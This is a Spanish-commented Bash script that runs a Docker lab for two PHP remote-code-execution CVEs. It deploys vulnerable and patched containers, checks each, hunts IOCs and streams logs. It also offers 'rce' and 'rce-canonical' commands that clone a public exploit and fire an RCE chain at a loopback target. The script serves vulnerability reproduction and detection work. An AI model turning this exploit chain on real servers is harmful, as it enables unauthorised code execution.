#!/usr/bin/env bash
# ============================================================================
#  p2s.sh — PHP2Shell Lab · CVE-2026-109618 / CVE-2026-109619
#  Script ÚNICO de operación: despliega, verifica, explota y detiene el lab.
#
#  USO EXCLUSIVO EN ENTORNO AISLADO DE LABORATORIO (solo loopback).
#  La explotación se ejecuta contra contenedores propios; apuntarla a
#  sistemas de terceros es ilegal.
#
#  Exit codes: 0=éxito/acción completada · 1=fallo de la acción · 2=uso erróneo
#  (En `test`, los códigos son semánticos del repro: 0=VULNERABLE,
#   1=NOT_VULNERABLE, 2=INDETERMINADO — la receta valida el esperado.)
# ============================================================================
set -u
cd "$(dirname "$0")"

VULN_URL="http://localhost:8081/"
PATCH_URL="http://localhost:8082/"
VULN_CTR="php2shell-vulnerable"
PATCH_CTR="php2shell-patched"
RCE_CTR="php2shell-rce-target"
RCE_PORT="18081"
RCE_IMAGE="php@sha256:974e3a920309308e1690ed607e6cc3061d6906f90cc8d30fe519daa48bccf101"
CANON_CTR="php-10961x-poc-8511"
VENDOR="lab/vendor/php2shell-exp"

c_g="\033[92m"; c_r="\033[91m"; c_y="\033[93m"; c_b="\033[1m"; c_0="\033[0m"
ok()  { printf "${c_g}✔${c_0} $*\n"; }
bad() { printf "${c_r}✘${c_0} $*\n"; }
info(){ printf "${c_b}▸${c_0} $*\n"; }
die() { bad "$*"; exit 2; }

usage() {
cat <<'EOF'
PHP2Shell Lab (CVE-2026-109618/109619) — script único de operación

USO: ./p2s.sh <subcomando> [args]

  DESPLIEGUE Y CICLO DE VIDA (100% automático)
    up            Despliega TODO: lab vulnerable :8081 + parcheado :8082
                  + objetivo RCE :18081, y verifica salud de cada uno
    down          Detiene y elimina TODO automáticamente (lab + RCE + canónico)
    status        Estado de los contenedores y salud HTTP
    logs [CTR]    Sigue los logs (default: ambos contenedores del lab)
    clean         down + borra artefactos (pruebas del docroot, runs, caches)

  VERIFICACIÓN (sin explotar)
    test [all|vuln|patched]   Trigger + veredicto (all = contraste completo)
    iocs          Caza de IOCs en los logs del lab
    info          Reconocimiento del target RCE (versión, build, worker)
    check         Oracle de leak contra el target RCE (SIN fire)

  EXPLOTACIÓN (RCE completo — ver EXPLOTACION.md)
    rce <cmd>     Cadena RCE remota pura: p2s.sh rce "id"  (<=14 bytes,
                  reintentos con contenedor fresco; probabilística por ASLR)
    rce-canonical RCE canónico del autor (Chain A, determinista; sudo+gdb)

  EXTRAS
    demo          Secuencia guiada completa para grabar el vídeo
    vendor        Vende el exploit público (commit fijado) si falta
    help          Esta ayuda

EJEMPLOS:
  ./p2s.sh up && ./p2s.sh test all && ./p2s.sh iocs
  ./p2s.sh rce "id"
  ./p2s.sh rce-canonical
  ./p2s.sh down

⚠️  USO EXCLUSIVO EN LABORATORIO AISLADO. Solo loopback (127.0.0.1).
EOF
}

require_docker() { command -v docker >/dev/null 2>&1 || die "docker no está disponible"; }

# ---------------------------------------------------------------------------
cmd_up() {
  require_docker
  info "Desplegando el lab completo (compose: vulnerable :8081 + parcheado :8082)…"
  docker compose up -d || die "fallo docker compose up"
  info "Desplegando el objetivo RCE (:${RCE_PORT}, solo loopback, contenedor fresco)…"
  cmd_rce_target >/dev/null 2>&1
  sleep 3
  local health=0
  for entry in "$VULN_CTR|$(curl -s -m 3 "${VULN_URL}whoami.php")" \
               "$PATCH_CTR|$(curl -s -m 3 "${PATCH_URL}whoami.php")" \
               "$RCE_CTR|$(curl -s -m 3 "http://127.0.0.1:${RCE_PORT}/health.php" | head -c 60)"; do
    name="${entry%%|*}"; out="${entry#*|}"
    if [ -n "$out" ]; then ok "$name → $out"; else bad "$name sin respuesta"; health=1; fi
  done
  [ $health -eq 0 ] && ok "lab desplegado y saludable — ./p2s.sh test all" || { bad "algun contenedor no responde (¿imágenes aún descargándose?)"; exit 1; }
}

cmd_down() {
  require_docker
  info "Deteniendo y eliminando TODO (lab base, objetivo RCE, lab canónico)…"
  docker compose down --remove-orphans 2>/dev/null
  docker rm -f "$RCE_CTR" "$CANON_CTR" php-10961x-poc-8512 2>/dev/null
  ok "entorno detenido y eliminado"
}

cmd_status() {
  require_docker
  printf "${c_b}▸${c_0} contenedores:\n"
  docker ps -a --filter "label=lab.name=php2shell" --format "  {{.Names}}\t{{.Status}}" 2>/dev/null
  docker ps -a --filter "name=$RCE_CTR" --format "  {{.Names}}\t{{.Status}}" 2>/dev/null
  docker ps -a --filter "name=$CANON_CTR" --format "  {{.Names}}\t{{.Status}}" 2>/dev/null
  printf "${c_b}▸${c_0} salud HTTP:\n"
  printf "  vulnerable  : %s\n" "$(curl -s -m 3 "${VULN_URL}whoami.php" || echo 'sin respuesta')"
  printf "  parcheado   : %s\n" "$(curl -s -m 3 "${PATCH_URL}whoami.php" || echo 'sin respuesta')"
  printf "  rce-target  : %s\n" "$(curl -s -m 3 "http://127.0.0.1:${RCE_PORT}/health.php" | head -c 60 || echo 'sin respuesta')"
}

cmd_logs() {
  local ctr="${1:-}"
  if [ -n "$ctr" ]; then docker logs -f "$ctr"; else docker compose logs -f; fi
}

cmd_clean() {
  cmd_down
  rm -f lab/rce/www/o 2>/dev/null
  rm -rf "$VENDOR/runs" scripts/__pycache__ 2>/dev/null
  ok "artefactos borrados (pruebas del docroot, runs, caches)"
}

cmd_test() {
  local what="${1:-all}"
  case "$what" in
    vuln)
      python3 php2shell.py check "$VULN_URL" --attempts 3 --container "$VULN_CTR" "${@:2}"
      local code=$?
      if [ $code -eq 0 ]; then ok "test-vuln: VULNERABLE (exit 0, esperado)"; else bad "test-vuln: exit $code inesperado"; exit $code; fi ;;
    patched)
      python3 php2shell.py check "$PATCH_URL" --attempts 3 --container "$PATCH_CTR" "${@:2}"
      local code=$?
      if [ $code -eq 1 ]; then ok "test-patched: NOT_VULNERABLE (exit 1, esperado)"; else bad "test-patched: exit $code inesperado"; exit $code; fi ;;
    all)
      cmd_test vuln && echo && cmd_test patched ;;
    *) die "test: usa 'all', 'vuln' o 'patched'" ;;
  esac
}

cmd_iocs() {
  python3 php2shell.py iocs
}

cmd_vendor() {
  if [ -f "$VENDOR/tools/php2shell_stock_poc.py" ]; then
    ok "exploit ya vendido ($VENDOR)"
  else
    info "vendiendo exploit público (commit fijado b1e4199)…"
    git clone --depth 1 https://github.com/dinosn/php-cve-2026-10961x-lab-poc "$VENDOR" &&
      (cd "$VENDOR" && git checkout b1e419912219691417c72b122f6eb410b938eee7) &&
      rm -rf "$VENDOR/logs" "$VENDOR/evidence"
    ok "vendido; verifica: (cd $VENDOR && sha256sum -c SOURCE-SHA256SUMS)"
  fi
}

cmd_rce_target() {
  chmod 777 lab/rce/www 2>/dev/null
  rm -f lab/rce/www/o
  docker rm -f "$RCE_CTR" >/dev/null 2>&1
  docker run -d --name "$RCE_CTR" -p 127.0.0.1:"$RCE_PORT":80 \
    --memory 256m --memory-swap 256m \
    --volume "$PWD/lab/rce/mpm_prefork.conf:/etc/apache2/mods-available/mpm_prefork.conf:ro" \
    --volume "$PWD/lab/rce/www:/var/www/html" \
    "$RCE_IMAGE" >/dev/null
  sleep 3
}

cmd_rce() {
  [ -z "${1:-}" ] && die "uso: p2s.sh rce <cmd>   (p. ej. p2s.sh rce \"id\", <=14 bytes)"
  [ -f "$VENDOR/tools/php2shell_stock_poc.py" ] || cmd_vendor
  python3 php2shell.py rce "$@"
}

cmd_rce_canonical() {
  [ -f "$VENDOR/scripts/reproduce.sh" ] || cmd_vendor
  (cd "$VENDOR" && sudo ./scripts/reproduce.sh)
  local code=$?
  if [ $code -eq 0 ]; then ok "RCE canónico: Proven - Lab-Assisted RCE (evidencia en $VENDOR/runs/)"; else bad "rce-canonical: exit $code"; exit $code; fi
}

cmd_info()  { python3 php2shell.py info; }
cmd_check() { python3 php2shell.py leak; }

cmd_demo() {
  printf "${c_b}════════ PASO 1 · Identidad de los workers ════════${c_0}\n"
  printf "vulnerable → "; curl -s "${VULN_URL}whoami.php"
  printf "parcheado  → "; curl -s "${PATCH_URL}whoami.php"
  printf "\n${c_b}════════ PASO 2 · Trigger contra el VULNERABLE ════════${c_0}\n"
  python3 php2shell.py check "$VULN_URL" --attempts 1 --container "$VULN_CTR"
  printf "\n${c_b}════════ PASO 3 · Trigger contra el PARCHEADO ════════${c_0}\n"
  python3 php2shell.py check "$PATCH_URL" --attempts 1 --container "$PATCH_CTR"
  printf "\n${c_b}════════ PASO 4 · Evidencia cruda en los logs ════════${c_0}\n"
  docker logs "$VULN_CTR" 2>&1 | grep -E "Fatal error|Segmentation" | tail -4
  printf "\n${c_b}════════ PASO 5 · IOCs ════════${c_0}\n"
  python3 scripts/php2shell_iocs.py
  printf "\n${c_g}Demo completada.${c_0} #PHP2Shell #CVE-2026-109618 #CVE-2026-109619\n"
}

main() {
  local cmd="${1:-help}"
  shift 2>/dev/null || true
  case "$cmd" in
    up)            cmd_up "$@" ;;
    down|stop)     cmd_down ;;
    status|ps)     cmd_status ;;
    logs)          cmd_logs "$@" ;;
    clean)         cmd_clean ;;
    test)          cmd_test "$@" ;;
    iocs)          cmd_iocs ;;
    info)          cmd_info ;;
    check)         cmd_check ;;
    rce)           cmd_rce "$@" ;;
    rce-canonical|rce-reproduce) cmd_rce_canonical ;;
    demo)          cmd_demo ;;
    vendor)        cmd_vendor ;;
    help|-h|--help) usage ;;
    *) usage; echo; die "subcomando desconocido: '$cmd'" ;;
  esac
}

main "$@"
